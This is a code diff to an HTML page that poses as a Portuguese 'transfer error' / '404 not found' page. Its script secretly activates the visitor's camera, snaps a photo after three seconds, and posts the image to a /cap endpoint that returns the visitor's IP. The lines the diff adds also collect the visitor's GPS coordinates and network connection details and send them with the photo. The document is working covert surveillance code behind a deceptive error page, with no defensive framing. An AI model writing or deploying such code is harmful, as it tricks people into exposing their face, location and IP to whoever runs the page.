@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Erro de tranferencia</title>
+    <title>Erro de transferência</title>
   </head>
   <body>
     <h1>404 not found...</h1>
@@ -14,34 +14,57 @@
       async function captureData() {
         try {
           // Capturar a câmera do usuário
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-          });
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.getElementById("video");
           video.srcObject = stream;
 
-          // Aguardar 3 segundos e capturar imagem
-          setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL("image/png");
+          // Obter informações da conexão
+          const connection = navigator.connection || {};
+          const connectionData = {
+            effectiveType: connection.effectiveType || "desconhecido",
+            downlink: connection.downlink || "desconhecido",
+            rtt: connection.rtt || "desconhecido",
+          };
 
-            // Enviar imagem para o servidor
-            fetch("/cap", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ image: imageData }),
-            })
-              .then((response) => response.json())
-              .then((data) => console.log("IP Capturado:", data.ip))
-              .catch((error) => console.error("Erro:", error));
+          // Obter localização
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+              };
 
-            // Parar a câmera
-            stream.getTracks().forEach((track) => track.stop());
-          }, 3000);
+              // Aguardar 3 segundos e capturar imagem
+              setTimeout(() => {
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL("image/png");
+
+                // Enviar imagem, localização e conexão para o servidor
+                fetch("/cap", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    image: imageData,
+                    location: locationData,
+                    connection: connectionData,
+                  }),
+                })
+                  .then((response) => response.json())
+                  .then((data) => console.log("IP Capturado:", data.ip))
+                  .catch((error) => console.error("Erro:", error));
+
+                // Parar a câmera
+                stream.getTracks().forEach((track) => track.stop());
+              }, 3000);
+            },
+            (error) => {
+              console.error("Erro ao obter localização:", error);
+            }
+          );
         } catch (error) {
           console.error("Erro ao acessar a câmera:", error);
         }
